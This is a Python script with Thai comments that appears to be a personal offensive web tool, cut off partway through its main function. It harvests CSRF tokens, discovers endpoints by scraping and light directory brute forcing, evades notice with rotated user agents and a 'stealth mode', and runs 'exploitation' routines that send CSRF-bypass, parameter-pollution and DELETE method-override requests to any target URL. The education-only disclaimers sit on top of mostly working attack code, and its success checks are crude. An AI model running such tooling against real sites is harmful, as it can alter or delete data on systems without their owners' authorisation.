#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🌸 CSRF Token + Endpoint Discovery Master 🌸
💕 Enhanced Framework สำหรับน้อง chin4d0ll
🔥 เร็วปรี๊ดดด ใช้เมมโมรี่น้อยๆ แต่ได้ข้อมูลเยอะมากกกก!
⚠️ เพื่อการศึกษาและป้องกันตัวเองเท่านั้น!
"""

import asyncio
import aiohttp
import re
import json
import time
import random
import gc
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from urllib.parse import urljoin, urlparse
from collections import defaultdict

# 💕 สีสวยๆ
class Colors:
    PINK = '\033[95m'
    PURPLE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    SPARKLE = '\033[5m'
    END = '\033[0m'

def print_cute(text, color=Colors.PINK):
    """ปริ้นแบบน่ารักๆ"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{timestamp}] 🌸 {text} 💕{Colors.END}")

def print_success(text):
    print_cute(f"✅ {text}", Colors.GREEN)

def print_warning(text):
    print_cute(f"⚠️ {text}", Colors.YELLOW)

def print_error(text):
    print_cute(f"❌ {text}", Colors.RED)

def print_info(text):
    print_cute(f"ℹ️ {text}", Colors.CYAN)

@dataclass
class CSRFToken:
    """เก็บข้อมูล CSRF token"""
    token_value: str
    token_name: str = "csrf_token"
    extraction_method: str = "form"
    source_url: str = ""
    expires_at: Optional[datetime] = None
    is_valid: bool = True

@dataclass
class APIEndpoint:
    """เก็บข้อมูล API endpoint ที่เจอ"""
    url: str
    method: str = "GET"
    parameters: List[str] = field(default_factory=list)
    headers_required: Dict[str, str] = field(default_factory=dict)
    csrf_required: bool = False
    csrf_token: Optional[CSRFToken] = None
    response_type: str = "unknown"
    status_code: int = 0
    authentication_required: bool = False
    rate_limited: bool = False
    description: str = ""
    vulnerability_indicators: List[str] = field(default_factory=list)

class CSRFEndpointMaster:
    """Enhanced Framework สำหรับ CSRF และ Endpoint Discovery"""
    
    def __init__(self, max_workers: int = 50, stealth_mode: bool = True):
        print_cute("💕 กำลังเตรียม Enhanced CSRF + Endpoint Framework...", Colors.PURPLE)
        
        self.max_workers = max_workers
        self.stealth_mode = stealth_mode
        self.discovered_endpoints = []
        self.csrf_tokens = {}
        self.session_cookies = {}
        
        # สถิติการทำงาน
        self.stats = {
            'csrf_tokens_found': 0,
            'endpoints_discovered': 0,
            'requests_sent': 0,
            'vulnerabilities_found': 0,
            'rate_limits_hit': 0
        }
        
        # User agents หลากหลาย
        self.user_agents = [
            ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
             'AppleWebKit/537.36 (KHTML, like Gecko) '
             'Chrome/120.0.0.0 Safari/537.36'),
            ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
             'AppleWebKit/537.36 (KHTML, like Gecko) '
             'Chrome/120.0.0.0 Safari/537.36'),
            ('Mozilla/5.0 (X11; Linux x86_64) '
             'AppleWebKit/537.36 (KHTML, like Gecko) '
             'Chrome/120.0.0.0 Safari/537.36')
        ]
        
        # CSRF token patterns ที่พบบ่อย
        self.csrf_patterns = {
            'form_inputs': [
                (r'<input[^>]*name=["\']([^"\']*csrf[^"\']*)["\'][^>]*'
                 r'value=["\']([^"\']+)["\']'),
                (r'<input[^>]*value=["\']([^"\']+)["\'][^>]*'
                 r'name=["\']([^"\']*csrf[^"\']*)["\']'),
                (r'<input[^>]*name=["\']([^"\']*token[^"\']*)["\'][^>]*'
                 r'value=["\']([^"\']+)["\']'),
                r'<input[^>]*name=["\'](_token)["\'][^>]*value=["\']([^"\']+)["\']'
            ],
            'meta_tags': [
                (r'<meta[^>]*name=["\']([^"\']*csrf[^"\']*)["\'][^>]*'
                 r'content=["\']([^"\']+)["\']'),
                r'<meta[^>]*name=["\'](_token)["\'][^>]*content=["\']([^"\']+)["\']'
            ],
            'javascript': [
                r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'window\._token\s*=\s*["\']([^"\']+)["\']',
                r'Laravel\.csrfToken\s*=\s*["\']([^"\']+)["\']'
            ]
        }
        
        # Endpoint discovery patterns
        self.endpoint_patterns = {
            'api_paths': [
                r'["\'/](api/[^"\'>\s]+)',
                r'["\'/](rest/[^"\'>\s]+)',
                r'["\'/](v\d+/[^"\'>\s]+)',
                r'["\'/](graphql[^"\'>\s]*)',
                r'["\'/](ajax/[^"\'>\s]+)'
            ],
            'form_actions': [
                r'<form[^>]*action=["\']([^"\']+)["\']',
                r'action=["\']([^"\']+)["\']'
            ],
            'ajax_urls': [
                r'url["\']?\s*:\s*["\']([^"\']+)["\']',
                r'ajax\([^}]*url["\']?\s*:\s*["\']([^"\']+)["\']',
                r'fetch\(["\']([^"\']+)["\']',
                (r'XMLHttpRequest.*open\(["\'][^"\']*["\'],\s*'
                 r'["\']([^"\']+)["\']')
            ],
            'href_links': [
                r'href=["\']([^"\'#][^"\']*)["\']'
            ]
        }
        
        print_success("Enhanced CSRF + Endpoint Framework พร้อมแล้วค่า! 🔍💖")

    async def create_session_with_cookies(self, base_url: str) -> aiohttp.ClientSession:
        """สร้าง session พร้อม cookies สำหรับรักษา session"""
        
        connector = aiohttp.TCPConnector(
            limit=self.max_workers,
            limit_per_host=20,
            ttl_dns_cache=300,
            enable_cleanup_closed=True
        )
        
        timeout = aiohttp.ClientTimeout(total=30)
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': ('text/html,application/xhtml+xml,application/xml;'
                      'q=0.9,*/*;q=0.8'),
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # สร้าง cookie jar
        cookie_jar = aiohttp.CookieJar(unsafe=True)
        
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers,
            cookie_jar=cookie_jar
        )
        
        return session

    async def discover_csrf_tokens(self, target_url: str) -> List[CSRFToken]:
        """ค้นหา CSRF tokens จากเว็บไซต์"""
        print_info(f"🔍 กำลังค้นหา CSRF tokens ใน {target_url}")
        
        csrf_tokens = []
        session = await self.create_session_with_cookies(target_url)
        
        try:
            # เยี่ยมชมหน้าแรกเพื่อได้ session และ cookies
            async with session.get(target_url) as response:
                content = await response.text()
                self.stats['requests_sent'] += 1
                
                # เก็บ cookies ที่ได้รับ
                for cookie in session.cookie_jar:
                    self.session_cookies[cookie.key] = cookie.value
                
                # ค้นหา CSRF tokens ในหน้า
                page_tokens = self._extract_csrf_tokens_from_content(content, target_url)
                csrf_tokens.extend(page_tokens)
                
                # ค้นหา form pages อื่นๆ
                form_urls = self._extract_form_urls(content, target_url)
                
                print_info(f"📝 เจอ forms {len(form_urls)} ตัว, กำลังตรวจสอบ...")
                
                # ตรวจสอบแต่ละ form page
                for form_url in form_urls[:10]:  # จำกัดแค่ 10 forms เพื่อความเร็ว
                    try:
                        async with session.get(form_url) as form_response:
                            if form_response.status == 200:
                                form_content = await form_response.text()
                                form_tokens = self._extract_csrf_tokens_from_content(
                                    form_content, form_url)
                                csrf_tokens.extend(form_tokens)
                                self.stats['requests_sent'] += 1
                        
                        # หน่วงเวลาถ้าอยู่ใน stealth mode
                        if self.stealth_mode:
                            await asyncio.sleep(random.uniform(0.5, 1.5))
                            
                    except Exception as e:
                        print_warning(f"Error checking form URL {form_url}: {e}")
                        continue
            
            # ลบ duplicates
            unique_tokens = []
            seen_values = set()
            
            for token in csrf_tokens:
                if token.token_value not in seen_values:
                    unique_tokens.append(token)
                    seen_values.add(token.token_value)
                    # เก็บใน cache
                    key = f"{token.source_url}_{token.token_name}"
                    self.csrf_tokens[key] = token
            
            self.stats['csrf_tokens_found'] += len(unique_tokens)
            print_success(f"🎯 เจอ CSRF tokens ทั้งหมด {len(unique_tokens)} ตัว!")
            
            # แสดงรายละเอียด tokens ที่เจอ
            for i, token in enumerate(unique_tokens, 1):
                token_preview = (token.token_value[:20] + "..." 
                               if len(token.token_value) > 20 
                               else token.token_value)
                print_cute(f"   Token {i}: {token.token_name} = {token_preview} " +
                          f"(Method: {token.extraction_method})", Colors.CYAN)
        
        finally:
            await session.close()
        
        return unique_tokens

    def _extract_csrf_tokens_from_content(self, content: str, 
                                        source_url: str) -> List[CSRFToken]:
        """ดึง CSRF tokens จาก HTML content"""
        tokens = []
        
        # ค้นหาใน form inputs
        for pattern in self.csrf_patterns['form_inputs']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                groups = match.groups()
                if len(groups) >= 2:
                    # ตรวจสอบว่ากลุ่มไหนเป็น name และ value
                    name, value = groups[0], groups[1]
                    # ถ้า name ดูเหมือน token name มากกว่า
                    if (len(name) < len(value) and 
                        ('csrf' in name.lower() or 'token' in name.lower())):
                        token = CSRFToken(
                            token_value=value,
                            token_name=name,
                            extraction_method="form_input",
                            source_url=source_url
                        )
                        tokens.append(token)
                    else:
                        # สลับ name และ value
                        token = CSRFToken(
                            token_value=name,
                            token_name=value,
                            extraction_method="form_input",
                            source_url=source_url
                        )
                        tokens.append(token)
        
        # ค้นหาใน meta tags
        for pattern in self.csrf_patterns['meta_tags']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                name, value = match.groups()
                token = CSRFToken(
                    token_value=value,
                    token_name=name,
                    extraction_method="meta_tag",
                    source_url=source_url
                )
                tokens.append(token)
        
        # ค้นหาใน JavaScript
        for pattern in self.csrf_patterns['javascript']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                value = match.group(1)
                token = CSRFToken(
                    token_value=value,
                    token_name="csrf_token",  # default name
                    extraction_method="javascript",
                    source_url=source_url
                )
                tokens.append(token)
        
        return tokens

    def _extract_form_urls(self, content: str, base_url: str) -> List[str]:
        """ดึง URLs ของ forms จาก HTML"""
        form_urls = []
        
        # ค้นหา form actions
        for pattern in self.endpoint_patterns['form_actions']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                action_url = match.group(1)
                if action_url and action_url != '#':
                    full_url = urljoin(base_url, action_url)
                    form_urls.append(full_url)
        
        return form_urls

    async def discover_endpoints_comprehensive(self, target_url: str, 
                                             csrf_tokens: List[CSRFToken] = None) -> List[APIEndpoint]:
        """ค้นหา endpoints แบบครอบคลุม"""
        print_info(f"🕵️ กำลังค้นหา endpoints ใน {target_url}")
        
        endpoints = []
        session = await self.create_session_with_cookies(target_url)
        
        try:
            # 1. ค้นหาจากหน้าเว็บหลัก
            main_endpoints = await self._discover_from_main_page(session, target_url)
            endpoints.extend(main_endpoints)
            
            # 2. ค้นหาจาก JavaScript files
            js_endpoints = await self._discover_from_javascript(session, target_url)
            endpoints.extend(js_endpoints)
            
            # 3. ค้นหาจาก sitemap และ robots.txt
            sitemap_endpoints = await self._discover_from_sitemap(session, target_url)
            endpoints.extend(sitemap_endpoints)
            
            # 4. Directory brute force (เบาๆ)
            bruteforce_endpoints = await self._discover_via_bruteforce(session, target_url)
            endpoints.extend(bruteforce_endpoints)
            
            # 5. ทดสอบ endpoints ที่เจอพร้อม CSRF tokens
            if csrf_tokens:
                await self._test_endpoints_with_csrf(session, endpoints, csrf_tokens)
            
            # ลบ duplicates
            unique_endpoints = self._deduplicate_endpoints(endpoints)
            
            self.stats['endpoints_discovered'] += len(unique_endpoints)
            print_success(f"🎯 เจอ endpoints ทั้งหมด {len(unique_endpoints)} ตัว!")
            
        finally:
            await session.close()
        
        return unique_endpoints

    async def _discover_from_main_page(self, session: aiohttp.ClientSession, 
                                     target_url: str) -> List[APIEndpoint]:
        """ค้นหา endpoints จากหน้าเว็บหลัก"""
        endpoints = []
        
        try:
            async with session.get(target_url) as response:
                content = await response.text()
                self.stats['requests_sent'] += 1
                
                # ค้นหา API paths
                for pattern in self.endpoint_patterns['api_paths']:
                    matches = re.finditer(pattern, content, re.IGNORECASE)
                    for match in matches:
                        path = match.group(1)
                        full_url = urljoin(target_url, '/' + path)
                        
                        endpoint = APIEndpoint(
                            url=full_url,
                            method="GET",
                            description="Found in main page content"
                        )
                        endpoints.append(endpoint)
                
                # ค้นหา AJAX URLs
                for pattern in self.endpoint_patterns['ajax_urls']:
                    matches = re.finditer(pattern, content, re.IGNORECASE)
                    for match in matches:
                        url = match.group(1)
                        if not url.startswith(('http', '//')):
                            full_url = urljoin(target_url, url)
                        else:
                            full_url = url
                        
                        endpoint = APIEndpoint(
                            url=full_url,
                            method="POST",  # AJAX มักเป็น POST
                            description="Found in AJAX call"
                        )
                        endpoints.append(endpoint)
                
                # ค้นหา form actions
                for pattern in self.endpoint_patterns['form_actions']:
                    matches = re.finditer(pattern, content, re.IGNORECASE)
                    for match in matches:
                        action = match.group(1)
                        if action and action != '#':
                            full_url = urljoin(target_url, action)
                            
                            endpoint = APIEndpoint(
                                url=full_url,
                                method="POST",
                                csrf_required=True,  # forms มักต้องใช้ CSRF
                                description="Found in form action"
                            )
                            endpoints.append(endpoint)
        
        except Exception as e:
            print_warning(f"Error discovering from main page: {e}")
        
        return endpoints

    async def _discover_from_javascript(self, session: aiohttp.ClientSession, 
                                      target_url: str) -> List[APIEndpoint]:
        """ค้นหา endpoints จาก JavaScript files"""
        endpoints = []
        
        try:
            # หา JavaScript files จากหน้าหลัก
            async with session.get(target_url) as response:
                content = await response.text()
                
                # ค้นหา script tags
                script_pattern = r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']'
                script_matches = re.finditer(script_pattern, content, re.IGNORECASE)
                
                js_urls = []
                for match in script_matches:
                    js_url = match.group(1)
                    full_js_url = urljoin(target_url, js_url)
                    js_urls.append(full_js_url)
                
                print_info(f"📜 เจอ JavaScript files {len(js_urls)} ไฟล์")
                
                # ตรวจสอบแต่ละไฟล์ JS
                for js_url in js_urls[:10]:  # จำกัดแค่ 10 ไฟล์เพื่อความเร็ว
                    try:
                        async with session.get(js_url) as js_response:
                            if js_response.status == 200:
                                js_content = await js_response.text()
                                js_endpoints = self._extract_endpoints_from_js(
                                    js_content, target_url)
                                endpoints.extend(js_endpoints)
                                self.stats['requests_sent'] += 1
                        
                        if self.stealth_mode:
                            await asyncio.sleep(random.uniform(0.3, 1.0))
                            
                    except Exception as e:
                        continue
        
        except Exception as e:
            print_warning(f"Error discovering from JavaScript: {e}")
        
        return endpoints

    def _extract_endpoints_from_js(self, js_content: str, 
                                 base_url: str) -> List[APIEndpoint]:
        """ดึง endpoints จาก JavaScript content"""
        endpoints = []
        
        # Patterns สำหรับหา API endpoints ใน JS
        js_api_patterns = [
            r'["\']/(api/[^"\']+)["\']',
            r'["\']/(rest/[^"\']+)["\']',
            r'["\']/(ajax/[^"\']+)["\']',
            r'["\']/(v\d+/[^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'\.get\(["\']([^"\']+)["\']',
            r'\.post\(["\']([^"\']+)["\']',
            r'\.put\(["\']([^"\']+)["\']',
            r'\.delete\(["\']([^"\']+)["\']',
            r'url:\s*["\']([^"\']+)["\']',
            r'endpoint:\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in js_api_patterns:
            matches = re.finditer(pattern, js_content, re.IGNORECASE)
            for match in matches:
                url = match.group(1)
                
                # กำหนด method ตาม pattern
                method = "GET"
                if '.post(' in match.group(0) or 'POST' in match.group(0):
                    method = "POST"
                elif '.put(' in match.group(0):
                    method = "PUT"
                elif '.delete(' in match.group(0):
                    method = "DELETE"
                
                # สร้าง full URL
                if not url.startswith(('http', '//')):
                    full_url = urljoin(base_url, url)
                else:
                    full_url = url
                
                endpoint = APIEndpoint(
                    url=full_url,
                    method=method,
                    description="Found in JavaScript file"
                )
                endpoints.append(endpoint)
        
        return endpoints

    async def _discover_from_sitemap(self, session: aiohttp.ClientSession, 
                                   target_url: str) -> List[APIEndpoint]:
        """ค้นหา endpoints จาก sitemap.xml และ robots.txt"""
        endpoints = []
        
        # ตรวจสอบ robots.txt
        try:
            robots_url = urljoin(target_url, '/robots.txt')
            async with session.get(robots_url) as response:
                if response.status == 200:
                    robots_content = await response.text()
                    
                    # หา URLs ใน robots.txt
                    url_pattern = r'(?:Disallow|Allow):\s*([^\s]+)'
                    matches = re.finditer(url_pattern, robots_content)
                    
                    robots_count = 0
                    for match in matches:
                        path = match.group(1)
                        if path != '/':
                            full_url = urljoin(target_url, path)
                            endpoint = APIEndpoint(
                                url=full_url,
                                method="GET",
                                description="Found in robots.txt"
                            )
                            endpoints.append(endpoint)
                            robots_count += 1
                    
                    print_info(f"🤖 เจอ URLs ใน robots.txt: {robots_count} ตัว")
                    self.stats['requests_sent'] += 1
        
        except Exception as e:
            print_warning(f"Error checking robots.txt: {e}")
        
        return endpoints

    async def _discover_via_bruteforce(self, session: aiohttp.ClientSession, 
                                     target_url: str) -> List[APIEndpoint]:
        """ค้นหา endpoints ด้วย directory brute force (เบาๆ)"""
        endpoints = []
        
        # Wordlist เบาๆ สำหรับ brute force
        common_paths = [
            '/admin', '/api', '/api/v1', '/api/v2', '/rest', '/ajax',
            '/login', '/logout', '/register', '/profile', '/dashboard',
            '/users', '/user', '/account', '/settings', '/config',
            '/upload', '/download', '/search', '/contact', '/feedback',
            '/status', '/health', '/info', '/debug', '/test'
        ]
        
        print_info("🔨 ทำ directory brute force เบาๆ...")
        
        # ใช้ semaphore เพื่อจำกัดการเชื่อมต่อ
        semaphore = asyncio.Semaphore(10)  # จำกัดแค่ 10 connections พร้อมกัน
        
        async def check_path(path):
            async with semaphore:
                try:
                    test_url = urljoin(target_url, path)
                    async with session.get(test_url) as response:
                        self.stats['requests_sent'] += 1
                        
                        if response.status in [200, 302, 401, 403]:
                            endpoint = APIEndpoint(
                                url=test_url,
                                method="GET",
                                status_code=response.status,
                                description=f"Found via brute force (Status: {response.status})"
                            )
                            
                            # ตรวจสอบว่าต้องการ authentication มั้ย
                            if response.status == 401:
                                endpoint.authentication_required = True
                            
                            return endpoint
                        
                        # หน่วงเวลาเพื่อไม่ให้โดน rate limit
                        if self.stealth_mode:
                            await asyncio.sleep(random.uniform(0.1, 0.5))
                
                except Exception as e:
                    return None
        
        # รัน brute force แบบ parallel
        tasks = [check_path(path) for path in common_paths]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # เก็บผลลัพธ์ที่ได้
        for result in results:
            if isinstance(result, APIEndpoint):
                endpoints.append(result)
                print_success(f"📁 เจอ endpoint: {result.url} (Status: {result.status_code})")
        
        return endpoints

    async def _test_endpoints_with_csrf(self, session: aiohttp.ClientSession, 
                                      endpoints: List[APIEndpoint], 
                                      csrf_tokens: List[CSRFToken]):
        """ทดสอบ endpoints พร้อม CSRF tokens"""
        print_info(f"🧪 ทดสอบ {len(endpoints)} endpoints พร้อม CSRF tokens...")
        
        for endpoint in endpoints[:20]:  # ทดสอบแค่ 20 endpoints แรกเพื่อความเร็ว
            if endpoint.method in ['POST', 'PUT', 'DELETE']:
                # ลองใช้ CSRF token แต่ละตัว
                for csrf_token in csrf_tokens[:3]:  # ลองแค่ 3 tokens แรก
                    try:
                        # เตรียม data สำหรับส่ง
                        data = {csrf_token.token_name: csrf_token.token_value}
                        headers = {}
                        
                        # เพิ่ม CSRF token ใน header ถ้าจำเป็น
                        if 'X-CSRF-TOKEN' in csrf_token.token_name.upper():
                            headers['X-CSRF-TOKEN'] = csrf_token.token_value
                        elif 'X-XSRF-TOKEN' in csrf_token.token_name.upper():
                            headers['X-XSRF-TOKEN'] = csrf_token.token_value
                        
                        # ส่ง request
                        if endpoint.method == 'POST':
                            async with session.post(endpoint.url, data=data, 
                                                  headers=headers) as response:
                                endpoint.status_code = response.status
                                endpoint.csrf_token = csrf_token
                                
                                # ตรวจสอบ response
                                response_text = await response.text()
                                if response.status == 200:
                                    endpoint.csrf_required = True
                                    print_success(f"✅ CSRF working: {endpoint.url}")
                                elif ('csrf' in response_text.lower() or 
                                      'token' in response_text.lower()):
                                    endpoint.csrf_required = True
                                    print_warning(f"⚠️ CSRF required: {endpoint.url}")
                        
                        self.stats['requests_sent'] += 1
                        
                        if self.stealth_mode:
                            await asyncio.sleep(random.uniform(0.5, 1.5))
                            
                    except Exception as e:
                        continue

    def _deduplicate_endpoints(self, endpoints: List[APIEndpoint]) -> List[APIEndpoint]:
        """ลบ endpoints ที่ซ้ำกัน"""
        unique_endpoints = []
        seen_urls = set()
        
        for endpoint in endpoints:
            url_key = f"{endpoint.method}:{endpoint.url}"
            if url_key not in seen_urls:
                seen_urls.add(url_key)
                unique_endpoints.append(endpoint)
        
        return unique_endpoints

    async def exploit_endpoints_with_csrf(self, endpoints: List[APIEndpoint], 
                                        csrf_tokens: List[CSRFToken]) -> List[Dict]:
        """ทำการ exploit endpoints ด้วย CSRF tokens"""
        print_info(f"💥 เริ่มการ exploit {len(endpoints)} endpoints...")
        
        exploits_results = []
        session = await self.create_session_with_cookies(endpoints[0].url if endpoints else "")
        
        try:
            for endpoint in endpoints:
                if endpoint.csrf_required and endpoint.csrf_token:
                    # ลอง exploit แต่ละ endpoint
                    for attack_type in ['csrf_bypass', 'parameter_pollution', 'method_override']:
                        result = await self._attempt_exploit(session, endpoint, attack_type)
                        if result['success']:
                            exploits_results.append(result)
                            self.stats['vulnerabilities_found'] += 1
                            print_success(f"🎯 Exploit สำเร็จ: {attack_type} ใน {endpoint.url}")
                        
                        if self.stealth_mode:
                            await asyncio.sleep(random.uniform(1, 3))
        
        finally:
            await session.close()
        
        return exploits_results

    async def _attempt_exploit(self, session: aiohttp.ClientSession, 
                             endpoint: APIEndpoint, attack_type: str) -> Dict:
        """ลองทำการโจมตี endpoint"""
        result = {
            'endpoint': endpoint.url,
            'attack_type': attack_type,
            'success': False,
            'details': '',
            'response_status': 0
        }
        
        try:
            if attack_type == 'csrf_bypass':
                # ลองส่ง request โดยไม่ใส่ CSRF token
                async with session.post(endpoint.url, data={'test': 'value'}) as response:
                    result['response_status'] = response.status
                    response_text = await response.text()
                    
                    # ถ้าผ่านได้แสดงว่า CSRF protection อ่อน
                    if response.status == 200 and 'error' not in response_text.lower():
                        result['success'] = True
                        result['details'] = 'CSRF protection bypassed'
            
            elif attack_type == 'parameter_pollution':
                # ลองส่ง CSRF token หลายตัว
                if endpoint.csrf_token:
                    data = {
                        endpoint.csrf_token.token_name: endpoint.csrf_token.token_value,
                        f"{endpoint.csrf_token.token_name}_backup": "fake_token",
                        "test": "value"
                    }
                    
                    async with session.post(endpoint.url, data=data) as response:
                        result['response_status'] = response.status
                        if response.status == 200:
                            result['success'] = True
                            result['details'] = 'Parameter pollution successful'
            
            elif attack_type == 'method_override':
                # ลองใช้ HTTP method override
                if endpoint.csrf_token:
                    data = {
                        endpoint.csrf_token.token_name: endpoint.csrf_token.token_value,
                        '_method': 'DELETE',
                        'test': 'value'
                    }
                    headers = {'X-HTTP-Method-Override': 'DELETE'}
                    
                    async with session.post(endpoint.url, data=data, 
                                          headers=headers) as response:
                        result['response_status'] = response.status
                        if response.status in [200, 202, 204]:
                            result['success'] = True
                            result['details'] = 'Method override successful'
        
        except Exception as e:
            result['details'] = f'Error: {e}'
        
        return result

    def generate_comprehensive_report(self, csrf_tokens: List[CSRFToken], 
                                    endpoints: List[APIEndpoint], 
                                    exploit_results: List[Dict] = None) -> str:
        """สร้างรายงานแบบครอบคลุม"""
        
        if exploit_results is None:
            exploit_results = []
        
        report_lines = [
            "🌸" * 60,
            "📊 Enhanced CSRF + Endpoint Discovery Report",
            f"⏰ สร้างเมื่อ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "👤 ผู้ใช้: chin4d0ll",
            "🌸" * 60,
            ""
        ]
        
        # สรุปผลการค้นหา
        report_lines.extend([
            "🎯 สรุปผลการค้นหา:",
            f"   🔑 CSRF Tokens ที่เจอ: {len(csrf_tokens)} ตัว",
            f"   🌐 Endpoints ที่เจอ: {len(endpoints)} ตัว",
            f"   📡 Requests ที่ส่ง: {self.stats['requests_sent']} ครั้ง",
            f"   🚨 ช่องโหว่ที่เจอ: {self.stats['vulnerabilities_found']} ตัว",
            ""
        ])
        
        # รายละเอียด CSRF Tokens
        if csrf_tokens:
            report_lines.extend([
                "🔑 CSRF Tokens ที่เจอ:",
                ""
            ])
            
            for i, token in enumerate(csrf_tokens, 1):
                token_preview = (token.token_value[:30] + "..." 
                               if len(token.token_value) > 30 
                               else token.token_value)
                report_lines.extend([
                    f"   Token {i}:",
                    f"      🏷️ Name: {token.token_name}",
                    f"      🔐 Value: {token_preview}",
                    f"      📍 Method: {token.extraction_method}",
                    f"      🔗 Source: {token.source_url}",
                    ""
                ])
        
        # รายละเอียด Endpoints
        if endpoints:
            report_lines.extend([
                "🌐 Endpoints ที่เจอ:",
                ""
            ])
            
            # จัดกลุ่มตาม method
            methods = defaultdict(list)
            for endpoint in endpoints:
                methods[endpoint.method].append(endpoint)
            
            for method, method_endpoints in methods.items():
                report_lines.extend([
                    f"   📌 {method} Endpoints ({len(method_endpoints)} ตัว):",
                    ""
                ])
                
                for endpoint in method_endpoints[:10]:  # แสดงแค่ 10 ตัวแรกต่อ method
                    csrf_status = "✅ Required" if endpoint.csrf_required else "❌ Not Required"
                    auth_status = "🔒 Required" if endpoint.authentication_required else "🔓 Not Required"
                    
                    report_lines.extend([
                        f"      🔗 {endpoint.url}",
                        f"         CSRF: {csrf_status}",
                        f"         Auth: {auth_status}",
                        f"         Status: {endpoint.status_code if endpoint.status_code else 'Not Tested'}",
                        f"         Description: {endpoint.description}",
                        ""
                    ])
        
        # ผลการ exploit
        if exploit_results:
            report_lines.extend([
                "💥 ผลการ Exploitation:",
                ""
            ])
            
            successful_exploits = [r for r in exploit_results if r['success']]
            failed_exploits = [r for r in exploit_results if not r['success']]
            
            report_lines.extend([
                f"   ✅ สำเร็จ: {len(successful_exploits)} ครั้ง",
                f"   ❌ ล้มเหลว: {len(failed_exploits)} ครั้ง",
                ""
            ])
            
            if successful_exploits:
                report_lines.extend([
                    "   🎯 การโจมตีที่สำเร็จ:",
                    ""
                ])
                
                for exploit in successful_exploits:
                    report_lines.extend([
                        f"      💥 {exploit['attack_type']}:",
                        f"         🔗 Target: {exploit['endpoint']}",
                        f"         📊 Status: {exploit['response_status']}",
                        f"         💬 Details: {exploit['details']}",
                        ""
                    ])
        
        # คำแนะนำด้านความปลอดภัย
        report_lines.extend([
            "💡 คำแนะนำด้านความปลอดภัย:",
            "   🔒 ใช้ CSRF tokens ในทุก state-changing requests",
            "   🛡️ ตรวจสอบ Referer header",
            "   🔐 ใช้ SameSite cookie attributes",
            "   ⚡ ใช้ double-submit cookie pattern",
            "   🚫 อย่าเปิดเผย CSRF tokens ใน URLs",
            "   🔍 ทำ penetration testing เป็นประจำ",
            ""
        ])
        
        # สถิติการทำงาน
        report_lines.extend([
            "📈 สถิติการทำงาน:",
            f"   🔍 CSRF Tokens พบ: {self.stats['csrf_tokens_found']}",
            f"   🌐 Endpoints ค้นพบ: {self.stats['endpoints_discovered']}",
            f"   📡 Requests ส่ง: {self.stats['requests_sent']}",
            f"   🚨 ช่องโหว่พบ: {self.stats['vulnerabilities_found']}",
            f"   🚦 Rate Limits Hit: {self.stats['rate_limits_hit']}",
            ""
        ])
        
        report_lines.extend([
            "🌸" * 60,
            "💖 รายงานสร้างโดย Enhanced CSRF + Endpoint Discovery Framework",
            "⚠️ ใช้ข้อมูลนี้อย่างรับผิดชอบและถูกกฎหมาย",
            "📚 เพื่อการศึกษาและป้องกันตัวเองเท่านั้น",
            "🌸" * 60
        ])
        
        return "\n".join(report_lines)

    def cleanup_resources(self):
        """ทำความสะอาดทรัพยากร"""
        self.csrf_tokens.clear()
        self.session_cookies.clear()
        self.discovered_endpoints.clear()
        gc.collect()
        print_success("🧹 ทำความสะอาดทรัพยากรเสร็จแล้ว!")

# 🎯 Main Application
async def main():
    """ฟังก์ชันหลักสำหรับรันโปรแกรม"""
    
    print_cute("""
    💕 ยินดีต้อนรับสู่ Enhanced CSRF + Endpoint Discovery Framework
    🌸 โดยเฉพาะสำหรับน้อง chin4d0ll!
    
    ✨ คุณสมบัติ:
    🔍 ค้นหา CSRF tokens แบบครอบคลุม
    🌐 ค้นหา endpoints จากหลายแหล่ง
    🧪 ทดสอบ endpoints พร้อม CSRF tokens
    💥 Exploitation และ bypass techniques
    📊 รายงานแบบละเอียด
    
    🚨 เพื่อการศึกษาและป้องกันตัวเองเท่านั้น!
    """, Colors.PURPLE)
    
    # สร้าง framework
    framework = CSRFEndpointMaster(max_workers=30, stealth_mode=True)
    
    try:
        # รับ input จากผู้ใช้หรือใช้ command line args
        import sys
        if len(sys.argv) > 1:
            target_url = sys.argv[1]
        else:
            target_url = input(f"{Colors.PINK}🎯 ใส่ URL เป้าหมาย: {Colors.END}").strip()
        
        if not target_url:
            target_url = "https://httpbin.org"  # ตัวอย่างสำหรับทดลอง
            print_warning(f"ใช้ตัวอย่าง: {target_url}")
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"https://{target_url}"
        
        # ถามว่าต้องการทำอะไรบ้าง (ถ้าไม่ได้ใส่ args)
        if len(sys.argv) <= 1:
            print_cute("\n🔧 เลือกการดำเนินการ:", Colors.CYAN)
            print("1. ค้นหา CSRF tokens เท่านั้น")
            print("2. ค้นหา endpoints เท่านั้น") 
            print("3. ค้นหา CSRF + endpoints")
            print("4. ทำทุกอย่าง + exploitation")
            
            choice = input(f"{Colors.PINK}🎯 เลือก (1-4): {Colors.END}").strip()
        else:
            choice = "3"  # default ถ้าใช้ command line
        
        csrf_tokens = []
        endpoints = []
        exploit_results = []
        
        if choice in ['1', '3', '4']:
            # ค้นหา CSRF tokens
